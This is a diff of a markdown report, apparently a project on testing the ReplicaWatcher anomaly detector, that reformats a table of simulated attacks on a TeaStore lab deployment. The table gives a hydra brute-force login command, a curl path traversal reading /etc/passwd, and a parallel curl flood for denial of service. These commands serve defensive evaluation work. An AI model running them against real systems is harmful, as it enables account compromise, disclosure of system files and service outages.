@@ -1159,14 +1159,14 @@ class TeaStoreUser(HttpUser):
 One of the clear limitation of replicawatcher that is also identified by the publications is the inability of the used training-less method of detecting uniform and brute force attacks. We will simulate a couple of attacks as descriped in the below table.
 
 
+## 🛡️ Attack Simulation Table
+
 | Attack Type             | Reference CWE | Targeted Service   | Implementation |
 |-------------------------|----------------|--------------------|----------------|
-| **Brute Force Login**   | CWE-307        | Teastore-auth      | <pre>hydra -l Testtt -P rockyou1.txt 192.168.122.199 -s 30080 http-post-form \
-"/tools.descartes.teastore.webui/loginAction:username=^USER^&password=^PASS^&referer=http%3A%2F%2F192.168.122.199%3A30080%2F&signin=Sign+in:F=302" \
--vV -t 4</pre> |
-| **Directory Traversal** | CWE-022        | frontend           | <pre>curl "http://&lt;teastore-ip&gt;:30080/tools.descartes.teastore.imageprovider/rest/image/../../../etc/passwd"</pre> |
-| **Denial of Service (DoS)** | CWE-400    | Teastore-WebUI     | <pre>seq 1 1000 \| xargs -n1 -P100 curl -s \
-"http://192.168.122.199:30080/tools.descartes.teastore.webui/rest/products" &gt; /dev/null</pre> |
+| **Brute force login**   | CWE-307        | Teastore-auth      | <code>hydra -l Testtt -P rockyou1.txt 192.168.122.199 -s 30080 http-post-form \<br>"/tools.descartes.teastore.webui/loginAction:username=^USER^&amp;password=^PASS^&amp;referer=http%3A%2F%2F192.168.122.199%3A30080%2F&amp;signin=Sign+in:F=302" \<br>-vV -t 4</code> |
+| **Directory traversal** | CWE-022        | frontend           | <code>curl "http://&lt;teastore-ip&gt;:30080/tools.descartes.teastore.imageprovider/rest/image/../../../etc/passwd"</code> |
+| **Denial of Service (DoS)** | CWE-400    | Teastore-WebUI     | <code>seq 1 1000 \| xargs -n1 -P100 curl -s \<br>"http://192.168.122.199:30080/tools.descartes.teastore.webui/rest/products" &gt; /dev/null</code> |
+
 
 
 ### ** 7.3.4 ReplicaWatcher Implementation**
